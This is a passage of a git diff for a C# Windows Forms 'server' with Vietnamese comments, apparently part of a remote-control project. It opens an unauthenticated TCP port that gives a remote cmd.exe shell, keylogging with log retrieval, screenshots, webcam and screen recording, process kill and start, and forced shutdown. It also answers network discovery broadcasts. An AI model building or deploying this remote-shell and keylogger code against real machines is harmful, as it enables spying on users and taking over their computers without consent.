@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -8,69 +10,108 @@ using System.Linq;
 using System.Management;
 using System.Net;
 using System.Net.Sockets;
+using System.Security;
 using System.Text;
 using System.Threading;
 using System.Timers;
 using System.Windows.Forms;
+using KeyLogger;
 using Microsoft.Win32;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement;
+
 
 namespace ServerApp
 {
     public partial class server : Form
     {
-        #region --- Variables & Objects ---
-
-        // Trạng thái kết nối
         private volatile bool isClientConnected = false;
 
-        // Các luồng xử lý
-        private Thread serverThread;          // Luồng TCP chính
-        private Thread udpDiscoveryThread;    // Luồng UDP Discovery
-        private Thread keylogThread = null;   // Luồng Keylogger
+        Thread serverThread; // Luồng chính để chạy Server lắng nghe TCP
+        Thread udpDiscoveryThread; // Luồng riêng cho UDP Discovery
+        Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
+        WebcamRecorder.WebcamCapture webcamCapture = null; // Instance cho Webcam
+        ScreenRecorder.ScreenCapture screenCapture = null; // Instance cho Screen Recorder
+        
+        PerformanceCounter cpuCounter;
+        PerformanceCounter ramCounter;
+        System.Timers.Timer statsTimer;
 
-        // Các object module (Giả định các class này đã tồn tại trong project của bạn)
-        private WebcamRecorder.WebcamCapture webcamCapture = null;
-        private ScreenRecorder.ScreenCapture screenCapture = null;
-
-        // Performance Counters & System Info
-        private PerformanceCounter cpuCounter;
-        private PerformanceCounter ramCounter;
-        private System.Timers.Timer statsTimer;
-
-        // Biến lưu thông tin hệ thống (Dùng volatile để thread-safe cơ bản)
-        private volatile string cachedSystemInfo = "0|0|Checking...|...|...|...|...";
-        private string staticHardwareInfo = ""; // Thông tin tĩnh (CPU, RAM, HDD...)
-
-        // Shell variable
-        private string ShellCurrentPath = "";
-
-        #endregion
+        string cachedSystemInfo = "0|0|Checking...|...|...|...";
+        String staticInfo = "";
 
         public server()
         {
             InitializeComponent();
-            CheckForIllegalCrossThreadCalls = false; // Lưu ý: Hạn chế update UI từ luồng khác
-            this.FormClosing += Server_FormClosing;
+            CheckForIllegalCrossThreadCalls = false;
+            this.FormClosing += new FormClosingEventHandler(server_FormClosing);
 
-            // Khởi tạo các thông số hệ thống ở background để không làm đơ UI lúc mở
-            Thread initThread = new Thread(InitializeSystemInfo);
+            // --- TẠO LUỒNG KHỞI TẠO RIÊNG (FIX LỖI KHỞI ĐỘNG CHẬM) ---
+            Thread initThread = new Thread(() =>
+            {
+                try
+                {
+                    // 1. Khởi tạo Counter (Nặng - mất khoảng 1-2s)
+                    cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+                    ramCounter = new PerformanceCounter("Memory", "Available MBytes");
+                    cpuCounter.NextValue(); // Làm nóng counter
+
+                    // 2. Lấy thông tin Tĩnh (Nặng - do truy xuất WMI và DNS)
+                    String hostname = Dns.GetHostName();
+                    String os = Environment.OSVersion.ToString();
+                    String ipAddr = GetLocalIPAddress(); // Hàm mới bên dưới
+
+                    String cpuName = GetHardwareInfo("Win32_Processor", "Name");       // Hàm mới bên dưới
+                    String gpuName = GetHardwareInfo("Win32_VideoController", "Name"); // Hàm mới bên dưới
+                    String totalRam = GetTotalRAM();
+
+                    // --- THÊM MỚI: Ổ CỨNG & MÀN HÌNH ---
+                    String diskInfo = "";
+                    try
+                    {
+                        List<string> drivesList = new List<string>();
+                        foreach (DriveInfo d in DriveInfo.GetDrives())
+                        {
+                            // Chỉ lấy ổ đĩa đã sẵn sàng (IsReady) và là ổ cứng cố định (Fixed)
+                            // Để tránh lỗi khi gặp ổ CD-ROM hoặc USB chưa cắm
+                            if (d.IsReady && d.DriveType == DriveType.Fixed)
+                            {
+                                long free = d.AvailableFreeSpace / (1024 * 1024 * 1024); // GB
+                                long total = d.TotalSize / (1024 * 1024 * 1024);         // GB
+
+                                // Format ngắn gọn: "C: 50/100GB"
+                                string dName = d.Name.Replace("\\", ""); // Bỏ dấu gạch chéo, C:\ thành C:
+                                drivesList.Add($"{dName} {free}/{total}GB");
+                            }
+                        }
+                        // Nối các ổ lại bằng dấu phẩy. VD: "C: 50/100GB, D: 400/500GB"
+                        diskInfo = string.Join(", ", drivesList);
+                    }
+                    catch { diskInfo = "Unknown"; }
+
+                    if (string.IsNullOrEmpty(diskInfo)) diskInfo = "No Fixed Drives";
+
+                    String screenRes = $"{Screen.PrimaryScreen.Bounds.Width}x{Screen.PrimaryScreen.Bounds.Height}";
+
+                    // Lưu format: |Hostname|OS|IP|CPU_Name|GPU_Name|Total_RAM
+                    staticInfo = $"|{hostname}|{os}|{ipAddr}|{cpuName}|{gpuName}|{totalRam}|{diskInfo}|{screenRes}";
+
+                    // 3. Sau khi lấy xong info thì mới bật Timer cập nhật
+                    statsTimer = new System.Timers.Timer(1000);
+                    statsTimer.Elapsed += UpdateSystemStats;
+                    statsTimer.AutoReset = true;
+                    statsTimer.Enabled = true;
+                }
+                catch (Exception)
+                {
+                    // Nếu lỗi thì gán giá trị mặc định để không crash
+                    staticInfo = "|Unknown|Unknown|Unknown|Generic CPU|Generic GPU|? GB|Unknown|0x0";
+                }
+            });
+
             initThread.IsBackground = true;
-            initThread.Start();
+            initThread.Start(); // Bắt đầu chạy ngầm
 
-            // Dọn dẹp log cũ khi khởi động
-            CleanUpOldLogs();
-        }
-
-        #region --- Initialization & Cleanup ---
-
-        private void Server_FormClosing(object sender, FormClosingEventArgs e)
-        {
-            // Kill toàn bộ process khi đóng Form để đảm bảo không còn thread chạy ngầm
-            Process.GetCurrentProcess().Kill();
-        }
-
-        private void CleanUpOldLogs()
-        {
+            // Xóa file log cũ (Giữ nguyên logic cũ của bạn)
             try
             {
                 if (File.Exists(KeyLogger.appstart.path))
@@ -79,370 +120,294 @@ namespace ServerApp
             catch { }
         }
 
-        private void InitializeSystemInfo()
+        // Đảm bảo ngắt toàn bộ tiến trình khi đóng Form
+        private void server_FormClosing(object sender, FormClosingEventArgs e)
         {
-            try
-            {
-                // 1. Khởi tạo Counters (Mất 1-2s)
-                cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-                ramCounter = new PerformanceCounter("Memory", "Available MBytes");
-                cpuCounter.NextValue(); // Call đầu tiên luôn là 0
-
-                // 2. Lấy thông tin tĩnh
-                string hostname = Dns.GetHostName();
-                string os = Environment.OSVersion.ToString();
-                string ipAddr = GetLocalIPAddress();
-                string cpuName = GetHardwareInfo("Win32_Processor", "Name");
-                string gpuName = GetHardwareInfo("Win32_VideoController", "Name");
-                string totalRam = GetTotalRAM();
-                string diskInfo = GetDiskInfo();
-                string screenRes = $"{Screen.PrimaryScreen.Bounds.Width}x{Screen.PrimaryScreen.Bounds.Height}";
-
-                // Format: |Hostname|OS|IP|CPU_Name|GPU_Name|Total_RAM|Disk|Screen
-                staticHardwareInfo = $"|{hostname}|{os}|{ipAddr}|{cpuName}|{gpuName}|{totalRam}|{diskInfo}|{screenRes}";
-
-                // 3. Bật Timer cập nhật thông tin động (CPU, RAM usage)
-                statsTimer = new System.Timers.Timer(1000);
-                statsTimer.Elapsed += UpdateSystemStats;
-                statsTimer.AutoReset = true;
-                statsTimer.Enabled = true;
-            }
-            catch (Exception ex)
-            {
-                staticHardwareInfo = $"|Unknown|Error: {ex.Message}|...|...|...|...|...|...";
-            }
+            System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
 
-        private string GetDiskInfo()
-        {
-            try
-            {
-                var drives = DriveInfo.GetDrives()
-                    .Where(d => d.IsReady && d.DriveType == DriveType.Fixed)
-                    .Select(d => $"{d.Name.Replace("\\", "")} {d.AvailableFreeSpace / (1024 * 1024 * 1024)}/{d.TotalSize / (1024 * 1024 * 1024)}GB");
-
-                string info = string.Join(", ", drives);
-                return string.IsNullOrEmpty(info) ? "No Fixed Drives" : info;
-            }
-            catch { return "Unknown Disk"; }
-        }
-
-        #endregion
-
-        #region --- Server Core Logic ---
-
-        // Nút Open Server
+        // Sự kiện nút "Open Server"
         private void button1_Click(object sender, EventArgs e)
         {
-            Button btn = sender as Button;
-            if (btn != null)
-            {
-                btn.Enabled = false;
-                btn.Text = "Running...";
-            }
+            ((System.Windows.Forms.Button)sender).Enabled = false;
+            ((System.Windows.Forms.Button)sender).Text = "Running...";
 
-            // Chạy TCP Server (Port 5656)
-            serverThread = new Thread(StartTcpServer);
+            // Chạy TCP Server trên luồng nền (Port 5656)
+            serverThread = new Thread(StartServerLoop);
             serverThread.IsBackground = true;
             serverThread.Start();
-
-            // Chạy UDP Listener (Port 9999)
+            
+            // --- THÊM MỚI: Chạy UDP Discovery Listener (Port 9999) ---
             udpDiscoveryThread = new Thread(StartUdpDiscoveryListener);
             udpDiscoveryThread.IsBackground = true;
             udpDiscoveryThread.Start();
         }
 
-        private void StartTcpServer()
+        // Vòng lặp chính: Lắng nghe kết nối TCP tại Port 5656
+        private void StartServerLoop()
         {
             try
             {
                 IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
                 Program.server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 Program.server.Bind(ip);
-                Program.server.Listen(100);
+                Program.server.Listen(100); // Hàng đợi tối đa 100 kết nối
 
                 while (true)
                 {
                     try
                     {
-                        // Chấp nhận kết nối
+                        // Server chờ kết nối (Block tại đây)
                         Socket tempClient = Program.server.Accept();
 
+                        // Nếu đã accept thành công -> Server đang BẬN
                         isClientConnected = true;
                         Program.client = tempClient;
+
                         Program.ns = new NetworkStream(Program.client);
                         Program.nr = new StreamReader(Program.ns);
-                        Program.nw = new StreamWriter(Program.ns) { AutoFlush = true };
+                        Program.nw = new StreamWriter(Program.ns);
+                        Program.nw.AutoFlush = true;
 
-                        // Vào vòng lặp xử lý lệnh
+                        // Vào vòng lặp xử lý lệnh (Block tại đây cho đến khi Client QUIT hoặc mất kết nối)
                         HandleClientCommunication();
                     }
-                    catch (Exception)
-                    {
-                        // Lỗi kết nối hoặc Client ngắt
+                    catch { 
+
                     }
                     finally
                     {
+                        // Dù thoát ra vì lý do gì (QUIT hay Crash), hãy đánh dấu là RẢNH
                         isClientConnected = false;
-                        // Đóng socket client cũ để giải phóng tài nguyên
+
+                        // Đảm bảo đóng socket cũ để tránh lỗi tài nguyên
                         try { if (Program.client != null) Program.client.Close(); } catch { }
                     }
                 }
             }
             catch (Exception ex)
             {
-                MessageBox.Show("Server Error (Port 5656): " + ex.Message);
-                Environment.Exit(1);
+                MessageBox.Show("Port 5656 Error: " + ex.Message);
+                Environment.Exit(0);
             }
         }
 
+        // Phân tích cú pháp lệnh gửi từ Client
+        // File: server.cs - Cập nhật hàm HandleClientCommunication
+
         private void HandleClientCommunication()
         {
-            string cmd = "";
-            // Reset lại đường dẫn Shell khi có kết nối mới (nếu muốn)
-            // ShellCurrentPath = Path.GetPathRoot(AppDomain.CurrentDomain.BaseDirectory);
-
+            String s = "";
             while (true)
             {
-                // Đọc lệnh từ Client
-                if (!ReceiveCommand(out cmd)) return; // Nếu mất kết nối -> Return thoát ra ngoài
-
-                Console.WriteLine($"[CMD] {cmd}"); // Debug log
-
-                switch (cmd)
+                Console.WriteLine($"[Received] {DateTime.Now.Ticks} - {s}"); // In ra thời gian và lệnh nhận được
+                receiveSignal(ref s);
+                switch (s)
                 {
-                    case "CMD": RemoteShellModule(); break;
-                    case "KEYLOG": KeyloggerModule(); break;
-                    case "PROCESS": ProcessHandler("All"); break;
-                    case "APPLICATION": ProcessHandler("App"); break;
-                    case "TAKEPIC": ScreenshotModule(); break;
-                    case "WEBCAM": WebcamModule(); break;
-                    case "SCREEN_REC": ScreenRecModule(); break;
+                    // --- NHÓM 1: CÁC MODULE CŨ ---
+                    case "CMD": remote_shell(); break;
+                    case "KEYLOG": keylog(); break;
+                    case "PROCESS": process(); break;
+                    case "APPLICATION": application(); break;
+                    case "TAKEPIC": takepic(); break;
+                    case "WEBCAM": webcam(); break;
+                    case "SCREEN_REC": screen_rec(); break;
+                    case "SHUTDOWN": Process.Start("ShutDown", "/s /t 0 /f"); break;
+                    case "RESTART": Process.Start("shutdown", "/r /t 0 /f"); break;
                     case "FILE":
                         FileManager fm = new FileManager();
                         fm.HandleFileCommand();
                         break;
-                    case "SYSTEM_INFO": SendSystemInfo(); break;
-
-                    // Power Commands
-                    case "SHUTDOWN": Process.Start("shutdown", "/s /t 0 /f"); break;
-                    case "RESTART": Process.Start("shutdown", "/r /t 0 /f"); break;
-
+                    case "SYSTEM_INFO": send_system_info(); break;
                     case "QUIT": return;
-                    default: break;
                 }
             }
         }
 
-        // Hàm helper để nhận lệnh an toàn, trả về false nếu mất kết nối
-        private bool ReceiveCommand(out string cmd)
+        // Hàm tiện ích để đọc dòng lệnh an toàn
+        public void receiveSignal(ref String s)
         {
-            cmd = "QUIT";
-            try
-            {
-                string line = Program.nr.ReadLine();
-                if (line == null) return false; // Client disconnect
-                cmd = line;
-                return true;
-            }
-            catch
-            {
-                return false;
-            }
+            try { s = Program.nr.ReadLine(); if (s == null) s = "QUIT"; }
+            catch { s = "QUIT"; }
         }
 
-        // Hàm helper để gửi dữ liệu text an toàn
-        private void SendData(string data)
+        // --- KHAI BÁO BIẾN TOÀN CỤC CHO MODULE SHELL (Đặt bên ngoài các hàm) ---
+        // Biến này sẽ lưu vị trí hiện tại của CMD, không bị mất đi khi Client ngắt kết nối
+        public string ShellCurrentPath = "";
+
+        // --- MODULE REMOTE SHELL (CMD) ---
+        public void remote_shell()
         {
-            try
-            {
-                Program.nw.WriteLine(data);
-                // Program.nw.Flush(); // Đã set AutoFlush = true
-            }
-            catch { }
-        }
+            String cmd = "";
 
-        #endregion
-
-        #region --- Module: Remote Shell (CMD) ---
-
-        public void RemoteShellModule()
-        {
-            string cmd = "";
+            // Khởi tạo lần đầu
             if (string.IsNullOrEmpty(ShellCurrentPath))
+            {
                 ShellCurrentPath = Path.GetPathRoot(AppDomain.CurrentDomain.BaseDirectory);
+            }
 
             while (true)
             {
-                if (!ReceiveCommand(out cmd)) return;
+                receiveSignal(ref cmd);
+
                 if (cmd == "QUIT") return;
-                if (cmd == "RESET") { ShellCurrentPath = ""; return; }
+
+                // --- THÊM MỚI: Xử lý lệnh RESET từ Disconnect ---
+                if (cmd == "RESET")
+                {
+                    ShellCurrentPath = ""; // Xóa đường dẫn đã lưu
+                    return; // Thoát module
+                }
 
                 if (cmd == "EXEC")
                 {
-                    string commandToRun = "";
-                    if (!ReceiveCommand(out commandToRun)) return; // Đọc lệnh cần chạy
-                    commandToRun = commandToRun.Trim();
+                    // ... (Toàn bộ phần code xử lý lệnh EXEC cũ giữ nguyên không đổi) ...
+                    // Để tiết kiệm không gian, tôi không paste lại đoạn xử lý EXEC dài dòng ở đây
+                    // Bạn hãy giữ nguyên nội dung bên trong block if (cmd == "EXEC") { ... } của bước trước nhé.
 
+                    // Code cũ của EXEC bắt đầu từ: string commandToRun = Program.nr.ReadLine().Trim();
+                    // ... cho đến hết block EXEC
+                    string commandToRun = Program.nr.ReadLine().Trim();
                     string output = "";
-                    string[] blacklist = { "powershell", "python", "bash", "sh" }; // Chặn các shell tương tác
+                    bool isBlacklisted = false;
 
-                    if (blacklist.Any(b => commandToRun.ToLower().Contains(b)))
+                    // 1. CHẶN LỆNH GÂY TREO
+                    string[] blacklist = { "cmd", "powershell", "python", "bash", "sh" };
+                    if (blacklist.Contains(commandToRun.ToLower()))
                     {
-                        output = "Error: Interactive shells are not supported.\n";
-                    }
-                    else if (commandToRun.ToLower().StartsWith("cd ") || commandToRun.ToLower() == "cd..")
-                    {
-                        // Xử lý lệnh CD nội bộ
-                        output = HandleCdCommand(commandToRun);
-                    }
-                    else if (commandToRun.Length == 2 && commandToRun[1] == ':')
-                    {
-                        // Xử lý đổi ổ đĩa (VD: D:)
-                        output = HandleDriveChange(commandToRun);
-                    }
-                    else
-                    {
-                        // Chạy lệnh CMD thực sự
-                        output = ExecuteCmd(commandToRun);
+                        output = "Error: Interactive commands are not supported.\n";
+                        isBlacklisted = true;
                     }
 
-                    // Format prompt output
+                    if (!isBlacklisted)
+                    {
+                        // 2. XỬ LÝ CD
+                        if (commandToRun.ToLower().StartsWith("cd ") || commandToRun.ToLower() == "cd..")
+                        {
+                            try
+                            {
+                                string pathArg = (commandToRun.Length > 2) ? commandToRun.Substring(2).Trim() : "";
+                                if (commandToRun.ToLower() == "cd..") pathArg = "..";
+
+                                string newPath = Path.GetFullPath(Path.Combine(ShellCurrentPath, pathArg));
+
+                                if (Directory.Exists(newPath)) ShellCurrentPath = newPath;
+                                else output = "The system cannot find the path specified.\n";
+                            }
+                            catch (Exception ex) { output = ex.Message + "\n"; }
+                        }
+                        // 3. XỬ LÝ ĐỔI Ổ ĐĨA
+                        else if (commandToRun.Length == 2 && commandToRun[1] == ':')
+                        {
+                            try
+                            {
+                                if (Directory.Exists(commandToRun + "\\")) ShellCurrentPath = commandToRun.ToUpper() + "\\";
+                                else output = "The system cannot find the drive specified.\n";
+                            }
+                            catch { output = "Error changing drive.\n"; }
+                        }
+                        // 4. LỆNH KHÁC
+                        else
+                        {
+                            try
+                            {
+                                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + commandToRun);
+                                psi.RedirectStandardOutput = true;
+                                psi.RedirectStandardError = true;
+                                psi.UseShellExecute = false;
+                                psi.CreateNoWindow = true;
+                                psi.StandardOutputEncoding = Encoding.UTF8;
+                                psi.StandardErrorEncoding = Encoding.UTF8;
+                                psi.WorkingDirectory = ShellCurrentPath;
+
+                                using (Process p = Process.Start(psi))
+                                {
+                                    if (!p.WaitForExit(5000))
+                                    {
+                                        try { p.Kill(); } catch { }
+                                        output += "Command timed out.\n";
+                                    }
+                                    output += p.StandardOutput.ReadToEnd();
+                                    string err = p.StandardError.ReadToEnd();
+                                    if (!string.IsNullOrEmpty(err)) output += "\n" + err;
+                                }
+                            }
+                            catch (Exception ex) { output = "Error: " + ex.Message + "\n"; }
+                        }
+                    }
+
+                    // 5. GẮN PROMPT
                     if (!output.EndsWith("\n") && output.Length > 0) output += "\n";
-                    string promptPath = ShellCurrentPath.EndsWith("\\") && ShellCurrentPath.Length > 3
-                                        ? ShellCurrentPath.Substring(0, ShellCurrentPath.Length - 1)
-                                        : ShellCurrentPath;
-                    output += promptPath + ">";
+                    string displayPath = ShellCurrentPath;
+                    if (displayPath.Length > 3 && displayPath.EndsWith("\\"))
+                        displayPath = displayPath.Substring(0, displayPath.Length - 1);
+                    output += displayPath + ">";
 
-                    // Gửi độ dài trước, sau đó gửi nội dung (để hỗ trợ Unicode tốt hơn)
                     byte[] buffer = Encoding.UTF8.GetBytes(output);
-                    SendData(buffer.Length.ToString());
-                    try { Program.client.Send(buffer); } catch { }
+                    Program.nw.WriteLine(buffer.Length.ToString());
+                    Program.nw.Flush();
+                    if (buffer.Length > 0) Program.client.Send(buffer);
                 }
             }
         }
 
-        private string HandleCdCommand(string cmd)
-        {
-            try
-            {
-                string pathArg = (cmd.Length > 2) ? cmd.Substring(2).Trim() : "";
-                if (cmd.ToLower() == "cd..") pathArg = "..";
-
-                string newPath = Path.GetFullPath(Path.Combine(ShellCurrentPath, pathArg));
-                if (Directory.Exists(newPath))
-                {
-                    ShellCurrentPath = newPath;
-                    return "";
-                }
-                return "The system cannot find the path specified.\n";
-            }
-            catch (Exception ex) { return ex.Message + "\n"; }
-        }
-
-        private string HandleDriveChange(string cmd)
-        {
-            try
-            {
-                if (Directory.Exists(cmd + "\\"))
-                {
-                    ShellCurrentPath = cmd.ToUpper() + "\\";
-                    return "";
-                }
-                return "The system cannot find the drive specified.\n";
-            }
-            catch { return "Error changing drive.\n"; }
-        }
-
-        private string ExecuteCmd(string command)
-        {
-            try
-            {
-                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
-                {
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    StandardOutputEncoding = Encoding.UTF8,
-                    StandardErrorEncoding = Encoding.UTF8,
-                    WorkingDirectory = ShellCurrentPath
-                };
-
-                using (Process p = Process.Start(psi))
-                {
-                    if (!p.WaitForExit(5000)) // Timeout 5s
-                    {
-                        try { p.Kill(); } catch { }
-                        return "Command timed out.\n";
-                    }
-                    string outStr = p.StandardOutput.ReadToEnd();
-                    string errStr = p.StandardError.ReadToEnd();
-                    return outStr + (string.IsNullOrEmpty(errStr) ? "" : "\n" + errStr);
-                }
-            }
-            catch (Exception ex) { return "Execution Error: " + ex.Message + "\n"; }
-        }
-
-        #endregion
-
-        #region --- Module: Keylogger ---
-
-        public void KeyloggerModule()
+        // --- MODULE KEYLOGGER ---
+        public void keylog()
         {
             KeyLogger.appstart.path = Application.StartupPath + @"\keylog_cache.txt";
-            string cmd = "";
+            String s = "";
 
             while (true)
             {
-                if (!ReceiveCommand(out cmd)) return;
-
-                switch (cmd)
+                receiveSignal(ref s);
+                switch (s)
                 {
-                    case "HOOK":
-                        if (keylogThread == null || !keylogThread.IsAlive)
+                    case "HOOK": // Bắt đầu ghi phím
+                        if (tklog == null || !tklog.IsAlive)
                         {
-                            keylogThread = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
-                            keylogThread.SetApartmentState(ApartmentState.STA);
-                            keylogThread.Start();
+                            tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
+                            tklog.SetApartmentState(ApartmentState.STA);
+                            tklog.Start();
                         }
                         break;
 
-                    case "UNHOOK":
-                        if (keylogThread != null && keylogThread.IsAlive)
+                    case "UNHOOK": // Dừng ghi phím
+                        if (tklog != null && tklog.IsAlive)
                         {
-                            try { keylogThread.Abort(); } catch { }
-                            keylogThread = null;
+                            try { tklog.Abort(); } catch { }
+                            tklog = null;
                         }
                         break;
 
-                    case "STATUS":
-                        bool isRunning = (keylogThread != null && keylogThread.IsAlive);
-                        SendData(isRunning ? "RUNNING" : "STOPPED");
+                    case "STATUS": // Kiểm tra trạng thái để hiển thị lên Web
+                        bool isRunning = (tklog != null && tklog.IsAlive);
+                        Program.nw.WriteLine(isRunning ? "RUNNING" : "STOPPED");
+                        Program.nw.Flush();
                         break;
 
-                    case "CLEAR":
+                    case "CLEAR": // Xóa file log
                         try { File.WriteAllText(KeyLogger.appstart.path, ""); } catch { }
-                        SendData("Logs Cleared");
+                        Program.nw.WriteLine("Logs Cleared");
+                        Program.nw.Flush();
                         break;
 
-                    case "PRINT":
-                        string logContent = " ";
+                    case "PRINT": // Đọc file log gửi về Client
+                        String log = "";
                         if (File.Exists(KeyLogger.appstart.path))
                         {
                             try
                             {
-                                // Mở file với chế độ ReadWrite Share để tránh lỗi khi keylogger đang ghi
                                 using (FileStream fs = new FileStream(KeyLogger.appstart.path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                 using (StreamReader sr = new StreamReader(fs))
                                 {
-                                    logContent = sr.ReadToEnd();
+                                    log = sr.ReadToEnd();
                                 }
                             }
-                            catch { logContent = "Error reading log."; }
+                            catch { log = "Reading..."; }
                         }
-                        if (string.IsNullOrEmpty(logContent)) logContent = " ";
-                        SendData(logContent);
+                        if (string.IsNullOrEmpty(log)) log = " ";
+                        Program.nw.WriteLine(log);
+                        Program.nw.Flush();
                         break;
 
                     case "QUIT": return;
@@ -450,292 +415,493 @@ namespace ServerApp
             }
         }
 
-        #endregion
-
-        #region --- Module: Screenshot (Fixed Memory Leak) ---
-
-        public void ScreenshotModule()
+        // --- MODULE SCREENSHOT ---
+        public void takepic()
         {
-            string cmd = "";
+            String ss = "";
             while (true)
             {
-                if (!ReceiveCommand(out cmd)) return;
-                if (cmd == "QUIT") return;
-
-                if (cmd == "TAKE")
+                receiveSignal(ref ss);
+                if (ss == "QUIT") return;
+                if (ss == "TAKE")
                 {
                     try
                     {
-                        // SỬ DỤNG USING ĐỂ GIẢI PHÓNG RAM NGAY LẬP TỨC
-                        using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
-                        {
-                            using (Graphics g = Graphics.FromImage(bmp))
-                            {
-                                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
-                                using (MemoryStream ms = new MemoryStream())
-                                {
-                                    bmp.Save(ms, ImageFormat.Png);
-                                    byte[] b = ms.ToArray();
+                        // 1. Chụp màn hình
+                        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                        Graphics g = Graphics.FromImage(bmp);
+                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
 
-                                    // Gửi size trước, sau đó gửi data
-                                    SendData(b.Length.ToString());
-                                    Program.client.Send(b);
-                                }
-                            }
-                        }
+                        // Gửi qua mạng về Client để lưu vào Django database
+                        MemoryStream ms = new MemoryStream();
+                        bmp.Save(ms, ImageFormat.Png);  // Đổi từ BMP sang PNG để file nhỏ hơn
+                        byte[] b = ms.ToArray();
+                        Program.nw.WriteLine(b.Length.ToString());
+                        Program.nw.Flush();
+                        Program.client.Send(b);
                     }
-                    catch
-                    {
-                        SendData("0"); // Báo lỗi hoặc ảnh rỗng
-                    }
+                    catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
                 }
             }
         }
 
-        #endregion
-
-        #region --- Module: Process & Application ---
+        // --- MODULE PROCESS & APPLICATION ---
+        // Sử dụng chung logic ProcessHandler để giảm lặp code
+        public void application() { ProcessHandler("App"); }
+        public void process() { ProcessHandler("All"); }
 
         private void ProcessHandler(string mode)
         {
-            string cmd = "";
+            String ss = "";
             while (true)
             {
-                if (!ReceiveCommand(out cmd)) return;
-                if (cmd == "QUIT") return;
+                receiveSignal(ref ss);
+                if (ss == "QUIT") return;
 
-                if (cmd == "XEM")
+                if (ss == "XEM") // Lấy danh sách
+                {
+                    Process[] pr = Process.GetProcesses();
+                    List<Process> filteredList = new List<Process>();
+                    foreach (Process p in pr)
+                    {
+                        // Nếu mode là App thì chỉ lấy cửa sổ có tiêu đề
+                        if (mode == "All" || p.MainWindowTitle.Length > 0) filteredList.Add(p);
+                    }
+
+                    // Sắp xếp danh sách
+                    if (mode == "App") filteredList = filteredList.OrderBy(p => p.MainWindowTitle).ToList();
+                    else filteredList = filteredList.OrderBy(p => p.ProcessName).ToList();
+
+                    // Gửi số lượng trước
+                    Program.nw.WriteLine(filteredList.Count.ToString()); Program.nw.Flush();
+
+                    // Gửi chi tiết từng Process
+                    foreach (Process p in filteredList)
+                    {
+                        if (mode == "App") Program.nw.WriteLine(p.MainWindowTitle);
+                        else Program.nw.WriteLine(p.ProcessName);
+                        Program.nw.Flush();
+                        Program.nw.WriteLine(p.Id.ToString()); Program.nw.Flush();
+                        Program.nw.WriteLine(p.Threads.Count.ToString()); Program.nw.Flush();
+                    }
+                }
+                else if (ss == "KILL") // Diệt tiến trình
+                {
+                    receiveSignal(ref ss);
+                    if (ss == "KILLID")
+                    {
+                        string id = Program.nr.ReadLine();
+                        try
+                        {
+                            Process p = Process.GetProcessById(int.Parse(id));
+                            string pName = (mode == "App") ? p.MainWindowTitle : p.ProcessName;
+                            p.Kill();
+                            Program.nw.WriteLine($"Successfully killed: {pName} (ID: {id})");
+                        }
+                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
+                        Program.nw.Flush();
+                    }
+                }
+                else if (ss == "START") // Mở tiến trình mới
+                {
+                    receiveSignal(ref ss);
+                    if (ss == "STARTID")
+                    {
+                        string name = Program.nr.ReadLine();
+                        try
+                        {
+                            Process.Start(name);
+                            Program.nw.WriteLine("Successfully started: " + name);
+                        }
+                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
+                        Program.nw.Flush();
+                    }
+                }
+            }
+        }
+
+        // === UDP DISCOVERY LISTENER ===
+        // Lắng nghe UDP broadcasts từ Python Web Server để tự động discover
+        private void StartUdpDiscoveryListener()
+        {
+            UdpClient udpServer = null;
+            try
+            {
+                // Tạo UDP listener trên Port 9999
+                // IPAddress.Any = Lắng nghe trên tất cả network interfaces
+                udpServer = new UdpClient(9999);
+                
+                // Log để debug
+                Console.WriteLine("[UDP Discovery] Listening on Port 9999...");
+                
+                // Endpoint để nhận data từ bất kỳ IP nào
+                IPEndPoint remoteEndpoint = new IPEndPoint(IPAddress.Any, 0);
+                
+                // Vòng lặp vô tận để lắng nghe broadcasts
+                while (true)
                 {
                     try
                     {
-                        var allProcs = Process.GetProcesses();
-                        var filteredList = (mode == "App")
-                            ? allProcs.Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).OrderBy(p => p.MainWindowTitle).ToList()
-                            : allProcs.OrderBy(p => p.ProcessName).ToList();
+                        // Receive(): Block và chờ đến khi nhận được data
+                        // Trả về bytes data và update remoteEndpoint với IP của sender
+                        byte[] receivedData = udpServer.Receive(ref remoteEndpoint);
+                        
+                        // Decode bytes → string
+                        string message = Encoding.UTF8.GetString(receivedData);
+                        
+                        Console.WriteLine($"[UDP Discovery] Received from {remoteEndpoint.Address}: {message}");
+                        
+                        // Kiểm tra message có đúng là "DISCOVER_SERVER" không
+                        if (message.Trim() == "DISCOVER_SERVER")
+                        {
+                            // Lấy hostname của máy này
+                            string hostname = Dns.GetHostName();
+                            
+                            // Lấy tất cả IP addresses của máy này
+                            // Một máy có thể có nhiều IPs (WiFi, LAN, VPN...)
+                            IPAddress[] addresses = Dns.GetHostAddresses(hostname);
+                            
+                            // Lọc chỉ lấy IPv4 addresses (bỏ IPv6)
+                            var ipv4Addresses = addresses.Where(ip => ip.AddressFamily == AddressFamily.InterNetwork);
+                            
